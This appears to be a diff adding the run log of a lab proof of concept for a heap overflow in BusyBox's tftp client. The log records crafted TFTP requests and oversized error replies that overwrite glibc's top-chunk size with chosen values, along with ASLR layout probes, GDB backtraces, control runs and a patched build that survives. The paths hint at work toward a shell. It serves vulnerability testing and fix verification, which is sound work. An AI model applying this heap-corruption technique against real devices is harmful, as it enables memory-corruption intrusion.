@@ -1,0 +1,77 @@
+=== CLOCK Mon Nov 23 11:51:41 PM UTC 2026
+=== PINS
+183410e8b1bbf9e07397d6ccf9eb20fa13c2644b8fffb4a40b94855f1d3b7044  vuln-tftp.c
+015669f9c8924fd006b02abcc2cb6665d9ec5cd7f749d8ca8b16859c996c888f  fixed-tftp.c
+46b20cb0107f457aea56dfd874ebf70fff2c5b009008f5571edd723d7820c2a1  fix.patch
+0013e9354961693f136572ec6e37dceb883b6951edcf01f423b276ed2aa765f5  busybox.config
+4ec897f312dd74a98cd1c127b662a88d13f5aec92e62e78a11193ac0ac996763  busybox-plain
+2e2b327c153aace6333c5228365fffcfaa2eb6389c1b48835c9fc61cd38b234b  busybox-fixed
+406e9c7522f3f5bea8f3a0e71753d7791f4a6b6c22c90dd9992f18532b118191  heap_probe.py
+7bb656f176e80a0c2216310c38978cb3de74a01fbb47d79be9b28a1e402053be  run-heap.sh
+=== 1 ASLR LAYOUT x5 (rbuf varies; xbuf=rbuf-0x50; next size 0x20cb1)
+MODE layout TOP_SIZE 0x4141414141414141 RC 0
+GDB FIRST RBUF=0x5a572bf3e310 XBUF=0x5a572bf3e2c0 CHUNKSIZE=0x51 NEXT_SIZE=0x20cb1
+MODE layout TOP_SIZE 0x4141414141414141 RC 0
+GDB FIRST RBUF=0x60ab8d8c1310 XBUF=0x60ab8d8c12c0 CHUNKSIZE=0x51 NEXT_SIZE=0x20cb1
+MODE layout TOP_SIZE 0x4141414141414141 RC 0
+GDB FIRST RBUF=0x58e20307e310 XBUF=0x58e20307e2c0 CHUNKSIZE=0x51 NEXT_SIZE=0x20cb1
+MODE layout TOP_SIZE 0x4141414141414141 RC 0
+GDB FIRST RBUF=0x629542956310 XBUF=0x6295429562c0 CHUNKSIZE=0x51 NEXT_SIZE=0x20cb1
+MODE layout TOP_SIZE 0x4141414141414141 RC 0
+GDB FIRST RBUF=0x588580dc3310 XBUF=0x588580dc32c0 CHUNKSIZE=0x51 NEXT_SIZE=0x20cb1
+=== 2 PLAIN ATTACK chosen top size 0x4141414141414141 (expect SIGABRT)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x4141414141414141 RC -6
+STDERR tftp: falling back to blocksize 512
+malloc(): corrupted top size
+
+=== 3 ISOLATION original top size 0x20cb1 (expect rc 1, no abort)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x20cb1 RC 1
+STDERR tftp: falling back to blocksize 512
+tftp: server error: (0) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+
+=== 4 VARIANT top size 0x4242424242424242 (expect same abort)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x4242424242424242 RC -6
+STDERR tftp: falling back to blocksize 512
+malloc(): corrupted top size
+
+=== 5 VARIANT top size 0x21 (expect glibc sysmalloc assertion)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x21 RC -6
+STDERR tftp: falling back to blocksize 512
+Fatal glibc error: malloc.c:2599 (sysmalloc): assertion failed: (old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)
+
+=== 6 CONTROL no -b 64, same 516-byte ERROR (expect rc 1, no abort)
+REQ b'\x00\x01MISHE\x00octet\x00tsize\x000\x00'
+MODE control TOP_SIZE 0x4141414141414141 RC 1
+STDERR tftp: server error: (0) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+=== 7 FIXED BUILD same attack (expect rc 1, no ASan overflow)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x4141414141414141 RC 1
+STDERR tftp: falling back to blocksize 512
+tftp: server error: (0) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+=== 8 ATTACK UNDER GDB (metadata before/after, abort backtrace)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack-gdb TOP_SIZE 0x4141414141414141 RC 0
+GDB Breakpoint 1, tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x56e505c8c2a0, local_file=0x7ffdeee8466c "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/heap-probe-out.bin", remote_file=0x7ffdeee846c2 "MISHE", want_transfer_size=1, blksize=64) at networking/tftp.c:604
+GDB FIRST RBUF=0x56e505c8c310 XBUF=0x56e505c8c2c0 CHUNKSIZE=0x51 NEXT_SIZE=0x20cb1
+GDB tftp: falling back to blocksize 512
+GDB Breakpoint 1, tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x56e505c8c2a0, local_file=0x7ffdeee8466c "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/heap-probe-out.bin", remote_file=0x7ffdeee846c2 "MISHE", want_transfer_size=1, blksize=512) at networking/tftp.c:604
+GDB SECOND IO_BUFSIZE=516 LEN=516 NEXT_SIZE=0x4141414141414141
+GDB #0  tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x56e505c8c2a0, local_file=0x7ffdeee8466c "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/heap-probe-out.bin", remote_file=0x7ffdeee846c2 "MISHE", want_transfer_size=1, blksize=512) at networking/tftp.c:604
+GDB #1  0x000056e4f8cc4251 in tftp_main (argc=10, argv=0x7ffdeee82f90) at networking/tftp.c:867
+GDB #2  0x000056e4f8cc2514 in run_applet_no_and_exit (applet_no=1, name=0x7ffdeee8465b "tftp", argv=0x7ffdeee82f50) at libbb/appletlib.c:969
+GDB #3  0x000056e4f8cc255d in run_applet_and_exit (name=0x7ffdeee8465b "tftp", argv=0x7ffdeee82f50) at libbb/appletlib.c:988
+GDB malloc(): corrupted top size
+GDB Program received signal SIGABRT, Aborted.
+GDB #0  __pthread_kill_implementation (no_tid=0, signo=6, threadid=<optimized out>) at ./nptl/pthread_kill.c:44
+GDB #1  __pthread_kill_internal (signo=6, threadid=<optimized out>) at ./nptl/pthread_kill.c:78
+GDB #2  __GI___pthread_kill (threadid=<optimized out>, signo=signo@entry=6) at ./nptl/pthread_kill.c:89
+GDB #3  0x00007a49ab24527e in __GI_raise (sig=sig@entry=6) at ../sysdeps/posix/raise.c:26
+GDB #4  0x00007a49ab2288ff in __GI_abort () at ./stdlib/abort.c:79
+GDB #5  0x00007a49ab2297b6 in __libc_message_impl (fmt=fmt@entry=0x7a49ab3cf8f0 "%s\n") at ../sysdeps/posix/libc_fatal.c:134
+=== DONE Mon Nov 23 11:52:20 PM UTC 2026
